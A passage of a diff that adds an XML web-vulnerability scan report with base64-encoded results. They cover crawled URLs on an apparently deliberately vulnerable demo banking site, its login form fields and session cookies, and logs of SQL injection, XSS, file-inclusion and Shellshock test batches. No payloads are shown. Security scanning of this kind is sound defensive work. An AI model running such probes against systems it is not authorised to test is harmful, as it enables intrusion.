+c3B4P2NvbnRlbnQ9am9icy8yMDA2MTAyNi5odG0KaHR0cDovL2RlbW8udGVzdGZpcmUubmV0L2Rl
+ZmF1bHQuYXNweD9jb250ZW50PXBlcnNvbmFsLmh0bQpodHRwOi8vZGVtby50ZXN0ZmlyZS5uZXQv
+ZGVmYXVsdC5hc3B4P2NvbnRlbnQ9cGVyc29uYWxfY2FyZHMuaHRtCmh0dHA6Ly9kZW1vLnRlc3Rm
+aXJlLm5ldC9kZWZhdWx0LmFzcHg/Y29udGVudD1wZXJzb25hbF9jaGVja2luZy5odG0KaHR0cDov
+L2RlbW8udGVzdGZpcmUubmV0L2RlZmF1bHQuYXNweD9jb250ZW50PXBlcnNvbmFsX2RlcG9zaXQu
+aHRtCmh0dHA6Ly9kZW1vLnRlc3RmaXJlLm5ldC9kZWZhdWx0LmFzcHg/Y29udGVudD1wZXJzb25h
+bF9pbnZlc3RtZW50cy5odG0KaHR0cDovL2RlbW8udGVzdGZpcmUubmV0L2RlZmF1bHQuYXNweD9j
+b250ZW50PXBlcnNvbmFsX2xvYW5zLmh0bQpodHRwOi8vZGVtby50ZXN0ZmlyZS5uZXQvZGVmYXVs
+dC5hc3B4P2NvbnRlbnQ9cGVyc29uYWxfb3RoZXIuaHRtCmh0dHA6Ly9kZW1vLnRlc3RmaXJlLm5l
+dC9kZWZhdWx0LmFzcHg/Y29udGVudD1wZXJzb25hbF9zYXZpbmdzLmh0bQpodHRwOi8vZGVtby50
+ZXN0ZmlyZS5uZXQvZGVmYXVsdC5hc3B4P2NvbnRlbnQ9cHIvMjAwNjA0MTMuaHRtCmh0dHA6Ly9k
+ZW1vLnRlc3RmaXJlLm5ldC9kZWZhdWx0LmFzcHg/Y29udGVudD1wci8yMDA2MDUxOC5odG0KaHR0
+cDovL2RlbW8udGVzdGZpcmUubmV0L2RlZmF1bHQuYXNweD9jb250ZW50PXByLzIwMDYwNzIwLmh0
+bQpodHRwOi8vZGVtby50ZXN0ZmlyZS5uZXQvZGVmYXVsdC5hc3B4P2NvbnRlbnQ9cHIvMjAwNjA4
+MTcuaHRtCmh0dHA6Ly9kZW1vLnRlc3RmaXJlLm5ldC9kZWZhdWx0LmFzcHg/Y29udGVudD1wci8y
+MDA2MDkyMS5odG0KaHR0cDovL2RlbW8udGVzdGZpcmUubmV0L2RlZmF1bHQuYXNweD9jb250ZW50
+PXByLzIwMDYwOTI4Lmh0bQpodHRwOi8vZGVtby50ZXN0ZmlyZS5uZXQvZGVmYXVsdC5hc3B4P2Nv
+bnRlbnQ9cHIvMjAwNjEwMDUuaHRtCmh0dHA6Ly9kZW1vLnRlc3RmaXJlLm5ldC9kZWZhdWx0LmFz
+cHg/Y29udGVudD1wci8yMDA2MTEwOS5odG0KaHR0cDovL2RlbW8udGVzdGZpcmUubmV0L2RlZmF1
+bHQuYXNweD9jb250ZW50PXByaXZhY3kuaHRtCmh0dHA6Ly9kZW1vLnRlc3RmaXJlLm5ldC9kZWZh
+dWx0LmFzcHg/Y29udGVudD1zZWN1cml0eS5odG0KaHR0cDovL2RlbW8udGVzdGZpcmUubmV0L2Rp
+c2NsYWltZXIuaHRtP3VybD1odHRwOi8vd3d3Lm1pY3Jvc29mdC5jb20KaHR0cDovL2RlbW8udGVz
+dGZpcmUubmV0L2Rpc2NsYWltZXIuaHRtP3VybD1odHRwOi8vd3d3Lm5ldHNjYXBlLmNvbQpodHRw
+Oi8vZGVtby50ZXN0ZmlyZS5uZXQvZmVlZGJhY2suYXNweApodHRwOi8vZGVtby50ZXN0ZmlyZS5u
+ZXQvaGlnaF95aWVsZF9pbnZlc3RtZW50cy5odG0KaHR0cDovL2RlbW8udGVzdGZpcmUubmV0L2lt
+YWdlcy9iX3JldGlyZW1lbnQuanBnCmh0dHA6Ly9kZW1vLnRlc3RmaXJlLm5ldC9pbnNpZGVfcG9p
+bnRzX29mX2ludGVyZXN0Lmh0bQpodHRwOi8vZGVtby50ZXN0ZmlyZS5uZXQvbm90Zm91bmQuYXNw
+eCUzRmFzcHhlcnJvcnBhdGg9L1ByaXZhY3lwb2xpY3kuYXNweApodHRwOi8vZGVtby50ZXN0Zmly
+ZS5uZXQvbm90Zm91bmQuYXNweD9hc3B4ZXJyb3JwYXRoPS9Qcml2YWN5cG9saWN5LmFzcHgKaHR0
+cDovL2RlbW8udGVzdGZpcmUubmV0L3ByL0RvY3MueG1sCmh0dHA6Ly9kZW1vLnRlc3RmaXJlLm5l
+dC9wci9EcmFmdC5ydGYKaHR0cDovL2RlbW8udGVzdGZpcmUubmV0L3ByL1EzX2Vhcm5pbmdzLnJ0
+ZgpodHRwOi8vZGVtby50ZXN0ZmlyZS5uZXQvcHIvY29tbXVuaXR5YW5udWFscmVwb3J0LnBkZgpo
+dHRwOi8vZGVtby50ZXN0ZmlyZS5uZXQvcmV0aXJlbWVudC5odG0KaHR0cDovL2RlbW8udGVzdGZp
+cmUubmV0L3NlYXJjaC5hc3B4Cmh0dHA6Ly9kZW1vLnRlc3RmaXJlLm5ldC9zZWN1cml0eS5odG0K
+aHR0cDovL2RlbW8udGVzdGZpcmUubmV0L3N1YnNjcmliZS5zd2YKaHR0cDovL2RlbW8udGVzdGZp
+cmUubmV0L3N1cnZleV9xdWVzdGlvbnMuYXNweApodHRwOi8vZGVtby50ZXN0ZmlyZS5uZXQvc3Vy
+dmV5X3F1ZXN0aW9ucy5hc3B4P3N0ZXA9YQo=
+]]></DATA>
+            </INFORMATION_GATHERED>
+            <INFORMATION_GATHERED>
+                <ID>245034722</ID>
+                <DETECTION_ID>1418107</DETECTION_ID>
+                <QID>150115</QID>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <DATA base64="true"><![CDATA[QXV0aGVudGljYXRpb24gZm9ybSBmb3VuZCBhdDogaHR0cDovL2RlbW8udGVzdGZpcmUubmV0L2Jh
+bmsvbG9naW4uYXNweAogQWN0aW9uIHVyaTogaHR0cDovL2RlbW8udGVzdGZpcmUubmV0L2Jhbmsv
+bG9naW4uYXNweAogRmllbGRzOiB1aWQsIHBhc3N3LCBidG5TdWJtaXQK
+]]></DATA>
+            </INFORMATION_GATHERED>
+            <INFORMATION_GATHERED>
+                <ID>245034734</ID>
+                <DETECTION_ID>1418116</DETECTION_ID>
+                <QID>150099</QID>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <DATA base64="true"><![CDATA[VG90YWwgY29va2llczogNApBU1AuTkVUX1Nlc3Npb25JZD15aHp2bnI1NXZlanNwZTQ1Z3BobXYz
+NDU7IEh0dHBPbmx5OyBwYXRoPS8gRmlyc3Qgc2V0IGF0IFVSTDogaHR0cDovL2RlbW8udGVzdGZp
+cmUubmV0L2JhbmsvbG9naW4uYXNweAphbVNlc3Npb25JZD0xMzQxNDE5MTAxNjE7IHBhdGg9LyBG
+aXJzdCBzZXQgYXQgVVJMOiBodHRwOi8vZGVtby50ZXN0ZmlyZS5uZXQvYmFuay9sb2dpbi5hc3B4
+CmFtVXNlcklkPTsgZXhwaXJlcz1XZWQsIDIwLVNlcC0yMDE3IDE4OjQxOjA4IEdNVDsgcGF0aD0v
+IEZpcnN0IHNldCBhdCBVUkw6IGh0dHA6Ly9kZW1vLnRlc3RmaXJlLm5ldC9iYW5rL2FjY291bnQu
+YXNweAphbUNyZWRpdE9mZmVyPTsgZXhwaXJlcz1XZWQsIDIwLVNlcC0yMDE3IDE4OjQxOjA4IEdN
+VDsgcGF0aD0vIEZpcnN0IHNldCBhdCBVUkw6IGh0dHA6Ly9kZW1vLnRlc3RmaXJlLm5ldC9iYW5r
+L2FjY291bnQuYXNweAo=
+]]></DATA>
+            </INFORMATION_GATHERED>
+            <INFORMATION_GATHERED>
+                <ID>245034733</ID>
+                <DETECTION_ID>1418115</DETECTION_ID>
+                <QID>45038</QID>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <DATA base64="true"><![CDATA[U2NhbiBkdXJhdGlvbjogMTE4MyBzZWNvbmRzCgpTdGFydCB0aW1lOiBUaHUsIFNlcCAyMSAyMDE3
+LCAyMDoyODoxNyBHTVQKCkVuZCB0aW1lOiBUaHUsIFNlcCAyMSAyMDE3LCAyMDo0ODowMCBHTVQK
+]]></DATA>
+            </INFORMATION_GATHERED>
+            <INFORMATION_GATHERED>
+                <ID>245034732</ID>
+                <DETECTION_ID>1418114</DETECTION_ID>
+                <QID>150028</QID>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <DATA base64="true"><![CDATA[VG90YWwgY29va2llczogNApBU1AuTkVUX1Nlc3Npb25JZD10c2tvbXA0NWl2aTU1cjQ1MzB0cDVn
+MmE7IEh0dHBPbmx5OyBwYXRoPS8gRmlyc3Qgc2V0IGF0IFVSTDogaHR0cDovL2RlbW8udGVzdGZp
+cmUubmV0L2JhbmsvbG9naW4uYXNweAphbVNlc3Npb25JZD0xMzIyNzE4OTkxMDA7IHBhdGg9LyBG
+aXJzdCBzZXQgYXQgVVJMOiBodHRwOi8vZGVtby50ZXN0ZmlyZS5uZXQvYmFuay9sb2dpbi5hc3B4
+Cmxhbmc9OyBwYXRoPS8gRmlyc3Qgc2V0IGF0IFVSTDogaHR0cDovL2RlbW8udGVzdGZpcmUubmV0
+L2JhbmsvY3VzdG9taXplLmFzcHgKVFJBQ0s9UWxQN015dDN6ZlNNbFN3RUloNUk2ZHR5bzsgcGF0
+aD0vIEZpcnN0IHNldCBhdCBVUkw6IGh0dHA6Ly93d3cuYWx0b3JvbXV0dWFsLmNvbS9idWcuYXNw
+eAo=
+]]></DATA>
+            </INFORMATION_GATHERED>
+            <INFORMATION_GATHERED>
+                <ID>245034738</ID>
+                <DETECTION_ID>1418120</DETECTION_ID>
+                <QID>150170</QID>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <DATA base64="true"><![CDATA[Ck51bWJlciBvZiBsb2dvdXQgbGlua3MgZGV0ZWN0ZWQ6IDIKaHR0cDovL2RlbW8udGVzdGZpcmUu
+bmV0L2JhbmsvbG9nb3V0LmFzcHgKaHR0cDovL2RlbW8udGVzdGZpcmUubmV0L2JhbmsvbG9nb3V0
+LmFzcHguY3MK
+]]></DATA>
+            </INFORMATION_GATHERED>
+            <INFORMATION_GATHERED>
+                <ID>245034728</ID>
+                <DETECTION_ID>1418111</DETECTION_ID>
+                <QID>150021</QID>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <DATA base64="true"><![CDATA[TG9hZGVkIDAgYmxhY2tsaXN0IGVudHJpZXMuCkxvYWRlZCAxIHdoaXRlbGlzdCBlbnRyaWVzLgpI
+VE1MIGZvcm0gYXV0aGVudGljYXRpb24gdW5hdmFpbGFibGUsIG5vIFdFQkFQUCBlbnRyeSBmb3Vu
+ZApObyBtb3JlIHJlcXVldWVzLCByZWR1bmRhbnQgbGluayB0aHJlc2hvbGQgaGFzIGJlZW4gc3Vy
+cGFzc2VkLgpDb2xsZWN0ZWQgOTggbGlua3Mgb3ZlcmFsbCBpbiAwIGhvdXJzIDMgbWludXRlcyBk
+dXJhdGlvbi4KUGF0aCBtYW5pcHVsYXRpb246IEVzdGltYXRlZCByZXF1ZXN0cyAocGF5bG9hZHMg
+eCBsaW5rcyk6IGZpbGVzIHdpdGggZXh0ZW5zaW9uOigwIHggNjYpICsgZmlsZXM6KDAgeCA2Nikg
+KyAgZGlyZWN0b3JpZXM6KDkgeCA5KSArICBwYXRoczooMCB4IDc1KSA9IHRvdGFsICg4MSkgCkJh
+dGNoICMwIFdTIERpcmVjdG9yeSBQYXRoIG1hbmlwdWxhdGlvbjogZXN0aW1hdGVkIHRpbWUgPCAx
+IG1pbnV0ZSAoOSB0ZXN0cywgNzUgaW5wdXRzKQpXUyBEaXJlY3RvcnkgUGF0aCBtYW5pcHVsYXRp
+b246IDkgdnVsbnNpZ3MgdGVzdHMsIGNvbXBsZXRlZCA4MSAgcmVxdWVzdHMsIDIgc2Vjb25kcy4g
+Q29tcGxldGVkIDgxIHJlcXVlc3RzIG9mIDgxIGVzdGltYXRlZCByZXF1ZXN0cyAoMTAwJSkuIEFs
+bCB0ZXN0cyBjb21wbGV0ZWQuCkJhdGNoICMwIFdTIGVudW1lcmF0aW9uOiBlc3RpbWF0ZWQgdGlt
+ZSA8IDEwIG1pbnV0ZXMgKDEwIHRlc3RzLCAxMDUgaW5wdXRzKQpXUyBlbnVtZXJhdGlvbjogMTAg
+dnVsbnNpZ3MgdGVzdHMsIGNvbXBsZXRlZCAxMDEgIHJlcXVlc3RzLCAyIHNlY29uZHMuIENvbXBs
+ZXRlZCAxMDEgcmVxdWVzdHMgb2YgMTA1MCBlc3RpbWF0ZWQgcmVxdWVzdHMgKDkuNjE5MDUlKS4g
+QWxsIHRlc3RzIGNvbXBsZXRlZC4KQmF0Y2ggIzEgVVJJIHBhcmFtZXRlciBtYW5pcHVsYXRpb24g
+KG5vIGF1dGgpOiBlc3RpbWF0ZWQgdGltZSA8IDEwIG1pbnV0ZXMgKDUwIHRlc3RzLCAxNyBpbnB1
+dHMpCkJhdGNoICMxIFVSSSBwYXJhbWV0ZXIgbWFuaXB1bGF0aW9uIChubyBhdXRoKTogNTAgdnVs
+bnNpZ3MgdGVzdHMsIGNvbXBsZXRlZCA4MzMgIHJlcXVlc3RzLCAxNiBzZWNvbmRzLiBDb21wbGV0
+ZWQgODMzIHJlcXVlc3RzIG9mIDg1MCBlc3RpbWF0ZWQgcmVxdWVzdHMgKDk4JSkuIEFsbCB0ZXN0
+cyBjb21wbGV0ZWQuCkJhdGNoICMxIEZvcm0gcGFyYW1ldGVyIG1hbmlwdWxhdGlvbiAobm8gYXV0
+aCk6IGVzdGltYXRlZCB0aW1lIDwgMSBtaW51dGUgKDUwIHRlc3RzLCA1IGlucHV0cykKQmF0Y2gg
+IzEgRm9ybSBwYXJhbWV0ZXIgbWFuaXB1bGF0aW9uIChubyBhdXRoKTogNTAgdnVsbnNpZ3MgdGVz
+dHMsIGNvbXBsZXRlZCAyMzAgIHJlcXVlc3RzLCA5IHNlY29uZHMuIENvbXBsZXRlZCAyMzAgcmVx
+dWVzdHMgb2YgMjUwIGVzdGltYXRlZCByZXF1ZXN0cyAoOTIlKS4gQWxsIHRlc3RzIGNvbXBsZXRl
+ZC4KQmF0Y2ggIzEgVVJJIGJsaW5kIFNRTCBtYW5pcHVsYXRpb24gKG5vIGF1dGgpOiBlc3RpbWF0
+ZWQgdGltZSA8IDEgbWludXRlICg4IHRlc3RzLCAxNyBpbnB1dHMpCkJhdGNoICMxIFVSSSBibGlu
+ZCBTUUwgbWFuaXB1bGF0aW9uIChubyBhdXRoKTogOCB2dWxuc2lncyB0ZXN0cywgY29tcGxldGVk
+IDI3MiAgcmVxdWVzdHMsIDYgc2Vjb25kcy4gQ29tcGxldGVkIDI3MiByZXF1ZXN0cyBvZiA0MDgg
+ZXN0aW1hdGVkIHJlcXVlc3RzICg2Ni42NjY3JSkuIEFsbCB0ZXN0cyBjb21wbGV0ZWQuCkJhdGNo
+ICMxIEZvcm0gYmxpbmQgU1FMIG1hbmlwdWxhdGlvbiAobm8gYXV0aCk6IGVzdGltYXRlZCB0aW1l
+IDwgMSBtaW51dGUgKDggdGVzdHMsIDUgaW5wdXRzKQpCYXRjaCAjMSBGb3JtIGJsaW5kIFNRTCBt
+YW5pcHVsYXRpb24gKG5vIGF1dGgpOiA4IHZ1bG5zaWdzIHRlc3RzLCBjb21wbGV0ZWQgNjkgIHJl
+cXVlc3RzLCAzIHNlY29uZHMuIENvbXBsZXRlZCA2OSByZXF1ZXN0cyBvZiAxMjAgZXN0aW1hdGVk
+IHJlcXVlc3RzICg1Ny41JSkuIEFsbCB0ZXN0cyBjb21wbGV0ZWQuCkJhdGNoICMxIFVSSSBwYXJh
+bWV0ZXIgdGltZS1iYXNlZCB0ZXN0cyAobm8gYXV0aCk6IGVzdGltYXRlZCB0aW1lIDwgMSBtaW51
+dGUgKDExIHRlc3RzLCAxNyBpbnB1dHMpCkJhdGNoICMxIFVSSSBwYXJhbWV0ZXIgdGltZS1iYXNl
+ZCB0ZXN0cyAobm8gYXV0aCk6IDExIHZ1bG5zaWdzIHRlc3RzLCBjb21wbGV0ZWQgMTg3ICByZXF1
+ZXN0cywgMTAgc2Vjb25kcy4gQ29tcGxldGVkIDE4NyByZXF1ZXN0cyBvZiAxODcgZXN0aW1hdGVk
+IHJlcXVlc3RzICgxMDAlKS4gQWxsIHRlc3RzIGNvbXBsZXRlZC4KQmF0Y2ggIzEgRm9ybSBmaWVs
+ZCB0aW1lLWJhc2VkIHRlc3RzIChubyBhdXRoKTogZXN0aW1hdGVkIHRpbWUgPCAxIG1pbnV0ZSAo
+MTEgdGVzdHMsIDUgaW5wdXRzKQpCYXRjaCAjMSBGb3JtIGZpZWxkIHRpbWUtYmFzZWQgdGVzdHMg
+KG5vIGF1dGgpOiAxMSB2dWxuc2lncyB0ZXN0cywgY29tcGxldGVkIDQ0ICByZXF1ZXN0cywgNCBz
+ZWNvbmRzLiBDb21wbGV0ZWQgNDQgcmVxdWVzdHMgb2YgNTUgZXN0aW1hdGVkIHJlcXVlc3RzICg4
+MCUpLiBBbGwgdGVzdHMgY29tcGxldGVkLgpCYXRjaCAjMiBVUkkgcGFyYW1ldGVyIG1hbmlwdWxh
+dGlvbiAobm8gYXV0aCk6IGVzdGltYXRlZCB0aW1lIDwgMSBtaW51dGUgKDUwIHRlc3RzLCAxNyBp
+bnB1dHMpCkJhdGNoICMyIFVSSSBwYXJhbWV0ZXIgbWFuaXB1bGF0aW9uIChubyBhdXRoKTogNTAg
+dnVsbnNpZ3MgdGVzdHMsIGNvbXBsZXRlZCA3ODQgIHJlcXVlc3RzLCAxNSBzZWNvbmRzLiBDb21w
+bGV0ZWQgNzg0IHJlcXVlc3RzIG9mIDg1MCBlc3RpbWF0ZWQgcmVxdWVzdHMgKDkyLjIzNTMlKS4g
+QWxsIHRlc3RzIGNvbXBsZXRlZC4KQmF0Y2ggIzIgRm9ybSBwYXJhbWV0ZXIgbWFuaXB1bGF0aW9u
+IChubyBhdXRoKTogZXN0aW1hdGVkIHRpbWUgPCAxIG1pbnV0ZSAoNTAgdGVzdHMsIDcgaW5wdXRz
+KQpCYXRjaCAjMiBGb3JtIHBhcmFtZXRlciBtYW5pcHVsYXRpb24gKG5vIGF1dGgpOiA1MCB2dWxu
+c2lncyB0ZXN0cywgY29tcGxldGVkIDM0MyAgcmVxdWVzdHMsIDcgc2Vjb25kcy4gQ29tcGxldGVk
+IDM0MyByZXF1ZXN0cyBvZiAzNTAgZXN0aW1hdGVkIHJlcXVlc3RzICg5OCUpLiBBbGwgdGVzdHMg
+Y29tcGxldGVkLgpCYXRjaCAjMiBVUkkgYmxpbmQgU1FMIG1hbmlwdWxhdGlvbiAobm8gYXV0aCk6
+IGVzdGltYXRlZCB0aW1lIDwgMSBtaW51dGUgKDggdGVzdHMsIDE3IGlucHV0cykKQmF0Y2ggIzIg
+VVJJIGJsaW5kIFNRTCBtYW5pcHVsYXRpb24gKG5vIGF1dGgpOiA4IHZ1bG5zaWdzIHRlc3RzLCBj
+b21wbGV0ZWQgMjU2ICByZXF1ZXN0cywgNiBzZWNvbmRzLiBDb21wbGV0ZWQgMjU2IHJlcXVlc3Rz
+IG9mIDQwOCBlc3RpbWF0ZWQgcmVxdWVzdHMgKDYyLjc0NTElKS4gQWxsIHRlc3RzIGNvbXBsZXRl
+ZC4KQmF0Y2ggIzIgRm9ybSBibGluZCBTUUwgbWFuaXB1bGF0aW9uIChubyBhdXRoKTogZXN0aW1h
+dGVkIHRpbWUgPCAxIG1pbnV0ZSAoOCB0ZXN0cywgNyBpbnB1dHMpCkJhdGNoICMyIEZvcm0gYmxp
+bmQgU1FMIG1hbmlwdWxhdGlvbiAobm8gYXV0aCk6IDggdnVsbnNpZ3MgdGVzdHMsIGNvbXBsZXRl
+ZCAxMTIgIHJlcXVlc3RzLCAyIHNlY29uZHMuIENvbXBsZXRlZCAxMTIgcmVxdWVzdHMgb2YgMTY4
+IGVzdGltYXRlZCByZXF1ZXN0cyAoNjYuNjY2NyUpLiBBbGwgdGVzdHMgY29tcGxldGVkLgpCYXRj
+aCAjMiBVUkkgcGFyYW1ldGVyIHRpbWUtYmFzZWQgdGVzdHMgKG5vIGF1dGgpOiBlc3RpbWF0ZWQg
+dGltZSA8IDEgbWludXRlICgxMSB0ZXN0cywgMTcgaW5wdXRzKQpCYXRjaCAjMiBVUkkgcGFyYW1l
+dGVyIHRpbWUtYmFzZWQgdGVzdHMgKG5vIGF1dGgpOiAxMSB2dWxuc2lncyB0ZXN0cywgY29tcGxl
+dGVkIDE3NiAgcmVxdWVzdHMsIDEwIHNlY29uZHMuIENvbXBsZXRlZCAxNzYgcmVxdWVzdHMgb2Yg
+MTg3IGVzdGltYXRlZCByZXF1ZXN0cyAoOTQuMTE3NiUpLiBBbGwgdGVzdHMgY29tcGxldGVkLgpC
+YXRjaCAjMiBGb3JtIGZpZWxkIHRpbWUtYmFzZWQgdGVzdHMgKG5vIGF1dGgpOiBlc3RpbWF0ZWQg
+dGltZSA8IDEgbWludXRlICgxMSB0ZXN0cywgNyBpbnB1dHMpCkJhdGNoICMyIEZvcm0gZmllbGQg
+dGltZS1iYXNlZCB0ZXN0cyAobm8gYXV0aCk6IDExIHZ1bG5zaWdzIHRlc3RzLCBjb21wbGV0ZWQg
+NzcgIHJlcXVlc3RzLCA0IHNlY29uZHMuIENvbXBsZXRlZCA3NyByZXF1ZXN0cyBvZiA3NyBlc3Rp
+bWF0ZWQgcmVxdWVzdHMgKDEwMCUpLiBBbGwgdGVzdHMgY29tcGxldGVkLgpCYXRjaCAjMyBVUkkg
+cGFyYW1ldGVyIG1hbmlwdWxhdGlvbiAobm8gYXV0aCk6IGVzdGltYXRlZCB0aW1lIDwgMSBtaW51
+dGUgKDUwIHRlc3RzLCAxNyBpbnB1dHMpCkJhdGNoICMzIFVSSSBwYXJhbWV0ZXIgbWFuaXB1bGF0
+aW9uIChubyBhdXRoKTogNTAgdnVsbnNpZ3MgdGVzdHMsIGNvbXBsZXRlZCA5MjkgIHJlcXVlc3Rz
+LCAxNyBzZWNvbmRzLiBDb21wbGV0ZWQgOTI5IHJlcXVlc3RzIG9mIDg1MCBlc3RpbWF0ZWQgcmVx
+dWVzdHMgKDEwOS4yOTQlKS4gQWxsIHRlc3RzIGNvbXBsZXRlZC4KQmF0Y2ggIzMgVVJJIGJsaW5k
+IFNRTCBtYW5pcHVsYXRpb24gKG5vIGF1dGgpOiBlc3RpbWF0ZWQgdGltZSA8IDEgbWludXRlICg4
+IHRlc3RzLCAxNyBpbnB1dHMpCkJhdGNoICMzIFVSSSBibGluZCBTUUwgbWFuaXB1bGF0aW9uIChu
+byBhdXRoKTogOCB2dWxuc2lncyB0ZXN0cywgY29tcGxldGVkIDI3MiAgcmVxdWVzdHMsIDUgc2Vj
+b25kcy4gQ29tcGxldGVkIDI3MiByZXF1ZXN0cyBvZiA0MDggZXN0aW1hdGVkIHJlcXVlc3RzICg2
+Ni42NjY3JSkuIEFsbCB0ZXN0cyBjb21wbGV0ZWQuCkJhdGNoICMzIFVSSSBwYXJhbWV0ZXIgdGlt
+ZS1iYXNlZCB0ZXN0cyAobm8gYXV0aCk6IGVzdGltYXRlZCB0aW1lIDwgMSBtaW51dGUgKDExIHRl
+c3RzLCAxNyBpbnB1dHMpCkJhdGNoICMzIFVSSSBwYXJhbWV0ZXIgdGltZS1iYXNlZCB0ZXN0cyAo
+bm8gYXV0aCk6IDExIHZ1bG5zaWdzIHRlc3RzLCBjb21wbGV0ZWQgMTg3ICByZXF1ZXN0cywgMTEg
+c2Vjb25kcy4gQ29tcGxldGVkIDE4NyByZXF1ZXN0cyBvZiAxODcgZXN0aW1hdGVkIHJlcXVlc3Rz
+ICgxMDAlKS4gQWxsIHRlc3RzIGNvbXBsZXRlZC4KQmF0Y2ggIzQgRE9NIFhTUyBleHBsb2l0YXRp
+b246IGVzdGltYXRlZCB0aW1lIDwgMSBtaW51dGUgKDEgdGVzdHMsIDEgaW5wdXRzKQpCYXRjaCAj
+NCBET00gWFNTIGV4cGxvaXRhdGlvbjogMSB2dWxuc2lncyB0ZXN0cywgY29tcGxldGVkIDAgIHJl
+cXVlc3RzLCAzIHNlY29uZHMuIE5vIHRlc3RzIHRvIGV4ZWN1dGUuCkJhdGNoICM0IEhUVFAgY2Fs
+bCBtYW5pcHVsYXRpb246IGVzdGltYXRlZCB0aW1lIDwgMSBtaW51dGUgKDMzIHRlc3RzLCA2IGlu
+cHV0cykKQmF0Y2ggIzQgSFRUUCBjYWxsIG1hbmlwdWxhdGlvbjogMzMgdnVsbnNpZ3MgdGVzdHMs
+IGNvbXBsZXRlZCA3OTIgIHJlcXVlc3RzLCA3IHNlY29uZHMuIENvbXBsZXRlZCA3OTIgcmVxdWVz
+dHMgb2YgOTkwIGVzdGltYXRlZCByZXF1ZXN0cyAoODAlKS4gQWxsIHRlc3RzIGNvbXBsZXRlZC4K
+QmF0Y2ggIzQgT3BlbiBSZWRpcmVjdCBhbmFseXNpczogZXN0aW1hdGVkIHRpbWUgPCAxIG1pbnV0
+ZSAoMSB0ZXN0cywgMiBpbnB1dHMpCkJhdGNoICM0IE9wZW4gUmVkaXJlY3QgYW5hbHlzaXM6IDEg
+dnVsbnNpZ3MgdGVzdHMsIGNvbXBsZXRlZCAyICByZXF1ZXN0cywgMyBzZWNvbmRzLiBDb21wbGV0
+ZWQgMiByZXF1ZXN0cyBvZiAyIGVzdGltYXRlZCByZXF1ZXN0cyAoMTAwJSkuIEFsbCB0ZXN0cyBj
+b21wbGV0ZWQuCkNTUkYgdGVzdHMgd2lsbCBub3QgYmUgbGF1bmNoZWQgYmVjYXVzZSB0aGUgc2Nh
+biBpcyBub3Qgc3VjY2Vzc2Z1bGx5IGF1dGhlbnRpY2F0ZWQuCkJhdGNoICM0IEZpbGUgSW5jbHVz
+aW9uIGFuYWx5c2lzOiBlc3RpbWF0ZWQgdGltZSA8IDEgbWludXRlICgxIHRlc3RzLCA5NyBpbnB1
+dHMpCkJhdGNoICM0IEZpbGUgSW5jbHVzaW9uIGFuYWx5c2lzOiAxIHZ1bG5zaWdzIHRlc3RzLCBj
+b21wbGV0ZWQgNDIgIHJlcXVlc3RzLCAzIHNlY29uZHMuIENvbXBsZXRlZCA0MiByZXF1ZXN0cyBv
+ZiA5NyBlc3RpbWF0ZWQgcmVxdWVzdHMgKDQzLjI5OSUpLiBBbGwgdGVzdHMgY29tcGxldGVkLgpC
+YXRjaCAjNCBDb29raWUgbWFuaXB1bGF0aW9uOiBlc3RpbWF0ZWQgdGltZSA8IDEwIG1pbnV0ZXMg
+KDM3IHRlc3RzLCAzIGlucHV0cykKQmF0Y2ggIzQgQ29va2llIG1hbmlwdWxhdGlvbjogMzcgdnVs
+bnNpZ3MgdGVzdHMsIGNvbXBsZXRlZCA3MTc2ICByZXF1ZXN0cywgMTU1IHNlY29uZHMuIENvbXBs
+ZXRlZCA3MTc2IHJlcXVlc3RzIG9mIDcwOTggZXN0aW1hdGVkIHJlcXVlc3RzICgxMDEuMDk5JSku
+IFhTUyBvcHRpbWl6YXRpb24gcmVtb3ZlZCA4MTYgbGlua3MuIEFsbCB0ZXN0cyBjb21wbGV0ZWQu
+CkJhdGNoICM0IEhlYWRlciBtYW5pcHVsYXRpb246IGVzdGltYXRlZCB0aW1lIDwgMTAgbWludXRl
+cyAoMzcgdGVzdHMsIDg2IGlucHV0cykKQmF0Y2ggIzQgSGVhZGVyIG1hbmlwdWxhdGlvbjogMzcg
+dnVsbnNpZ3MgdGVzdHMsIGNvbXBsZXRlZCAxOTE0ICByZXF1ZXN0cywgNDMgc2Vjb25kcy4gQ29t
+cGxldGVkIDE5MTQgcmVxdWVzdHMgb2YgNDMwMCBlc3RpbWF0ZWQgcmVxdWVzdHMgKDQ0LjUxMTYl
+KS4gWFNTIG9wdGltaXphdGlvbiByZW1vdmVkIDIwNjQgbGlua3MuIEFsbCB0ZXN0cyBjb21wbGV0
+ZWQuCkJhdGNoICM0IHNoZWxsIHNob2NrIGRldGVjdG9yOiBlc3RpbWF0ZWQgdGltZSA8IDEgbWlu
+dXRlICgxIHRlc3RzLCA4NiBpbnB1dHMpCkJhdGNoICM0IHNoZWxsIHNob2NrIGRldGVjdG9yOiAx
+IHZ1bG5zaWdzIHRlc3RzLCBjb21wbGV0ZWQgODcgIHJlcXVlc3RzLCAzIHNlY29uZHMuIENvbXBs
+ZXRlZCA4NyByZXF1ZXN0cyBvZiA4NiBlc3RpbWF0ZWQgcmVxdWVzdHMgKDEwMS4xNjMlKS4gQWxs
+IHRlc3RzIGNvbXBsZXRlZC4KQmF0Y2ggIzQgc2hlbGwgc2hvY2sgZGV0ZWN0b3IoZm9ybSk6IGVz
+dGltYXRlZCB0aW1lIDwgMSBtaW51dGUgKDEgdGVzdHMsIDIgaW5wdXRzKQpCYXRjaCAjNCBzaGVs
+bCBzaG9jayBkZXRlY3Rvcihmb3JtKTogMSB2dWxuc2lncyB0ZXN0cywgY29tcGxldGVkIDIgIHJl
+cXVlc3RzLCAwIHNlY29uZHMuIENvbXBsZXRlZCAyIHJlcXVlc3RzIG9mIDIgZXN0aW1hdGVkIHJl
+cXVlc3RzICgxMDAlKS4gQWxsIHRlc3RzIGNvbXBsZXRlZC4KQmF0Y2ggIzQgaHR0cG94eSBkZXRl
